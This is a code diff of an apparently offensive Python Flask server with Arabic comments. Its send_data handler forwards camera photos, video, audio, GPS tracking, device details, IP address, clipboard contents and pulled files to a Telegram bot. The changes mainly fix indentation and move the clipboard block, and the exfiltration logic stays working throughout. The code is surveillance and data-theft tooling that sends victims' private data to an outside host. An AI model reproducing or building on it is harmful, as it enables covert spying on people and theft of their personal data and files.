@@ -2081,7 +2081,7 @@ def send_data():
             return jsonify({'error': 'جلسة غير صالحة'}), 404
         chat_id = session['chat_id']
         
-        # إرسال الصور
+        # ====== إرسال الصور ======
         for key in ['camera_front', 'camera_back']:
             if data.get(key):
                 for img_data in data[key]:
@@ -2093,7 +2093,7 @@ def send_data():
                     except:
                         pass
         
-        # إرسال الفيديو
+        # ====== إرسال الفيديو ======
         if data.get('video'):
             try:
                 video = data['video'].split(',', 1)[1]
@@ -2103,7 +2103,7 @@ def send_data():
             except:
                 pass
         
-        # إرسال الصوت
+        # ====== إرسال الصوت ======
         if data.get('audio'):
             try:
                 audio = data['audio'].split(',', 1)[1]
@@ -2113,7 +2113,7 @@ def send_data():
             except:
                 pass
         
-        # إرسال الموقع
+        # ====== إرسال الموقع ======
         if data.get('location'):
             try:
                 loc = data['location']
@@ -2126,7 +2126,7 @@ def send_data():
             except:
                 pass
         
-        # إرسال معلومات الجهاز
+        # ====== إرسال معلومات الجهاز ======
         if data.get('device'):
             try:
                 device = data['device']
@@ -2136,37 +2136,31 @@ def send_data():
             except:
                 pass
         
-        # إرسال IP
+        # ====== إرسال IP ======
         if data.get('ip'):
             try:
                 url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                 requests.post(url, data={'chat_id': chat_id, 'text': f"🌐 IP: {data['ip']}"})
             except:
                 pass
+        
         # ====== الميزات الجديدة ======
-
-# تتبع الموقع المستمر
+        
+        # تتبع الموقع المستمر
         if data.get('locations'):
             for loc in data['locations']:
                 try:
                     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation"
                     requests.post(url, data={
-                'chat_id': chat_id,
-                'latitude': loc['lat'],
-                'longitude': loc['lng']
-            })
+                        'chat_id': chat_id,
+                        'latitude': loc['lat'],
+                        'longitude': loc['lng']
+                    })
                     time.sleep(0.3)
                 except:
                     pass
-            #الحافظة📋
-        if data.get('clipboard'):
-            try:
-                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
-                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
-            except:
-                pass
-# سحب الملفات
+        
+        # سحب الملفات
         if data.get('files'):
             for file_data in data['files']:
                 try:
@@ -2174,17 +2168,24 @@ def send_data():
                     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                     files = {'document': base64.b64decode(content)}
                     caption = f"📁 {file_data['name']} ({(file_data['size']/1024):.1f} KB)"
-                   requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
-                   time.sleep(0.3)
+                    requests.post(url, data={'chat_id': chat_id, 'caption': caption}, files=files)
+                    time.sleep(0.3)
                 except:
                     pass
-
-
-
+        
+        # الحافظة
+        if data.get('clipboard'):
+            try:
+                msg = f"📋 **محتوى الحافظة:**\n\n{data['clipboard']}"
+                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+                requests.post(url, data={'chat_id': chat_id, 'text': msg, 'parse_mode': 'Markdown'})
+            except:
+                pass
         
         return jsonify({'status': 'ok'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
+        
 
 # ============================================================
 #  بوت تيليجرام
